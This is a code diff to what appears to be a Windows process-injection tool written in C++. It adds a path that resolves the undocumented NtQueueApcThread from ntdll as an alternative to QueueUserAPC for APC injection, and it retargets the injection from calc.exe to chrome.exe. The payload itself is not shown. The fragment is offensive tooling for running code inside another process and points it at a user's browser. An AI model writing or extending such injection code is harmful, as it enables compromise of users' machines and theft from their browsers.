@@ -91,13 +91,30 @@ void inject(char* process){
             cout<<endl;
             ULONG_PTR parameter = 0; //nothing!
             if (hThread!=NULL) {
-                if(::QueueUserAPC(
+#ifndef __USE_NT_FUNCTIONS__
+                if(QueueUserAPC(
                     (PAPCFUNC)p,
                     hThread, 
                     parameter)==0){
                     cout<<"[!] failed to queue user apc"<<endl;
                 }
-                else{
+#else
+				HMODULE hNtdll = GetModuleHandleA("ntdll");
+			    if (hNtdll == NULL) {
+					cout<<"[!] Failed to find module 'ntdll' "<<endl;
+					return;
+				}
+				NTSTATUS (NTAPI *NtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, ULONG);
+				NtQueueApcThread = (NT_QUEUE_APC_THREAD) GetProcAddress(hNtdll,"NtQueueApcThread");
+				if(NtQueueApcThread==NULL){
+					cout<<"[!] Failed to get the address of NtQueueApcThread()"<<endl;
+					return;
+				}
+				if(NtQueueApcThread(hThread, p, NULL, NULL, NULL)!=0){
+					cout<<"[!] APC Queueing Failed"<<endl;
+				}
+#endif
+				else{
                     cout<<"[+] user apc queued for thread (id: "<<tid<<")"<<endl;
                 }
             }
@@ -117,7 +134,7 @@ void inject(char* process){
 
 void main(int argc, char* argv[]){
 	get_executer_details();
-    inject("calc.exe");
+    inject("chrome.exe");
 	cin.get();
     return;
 }
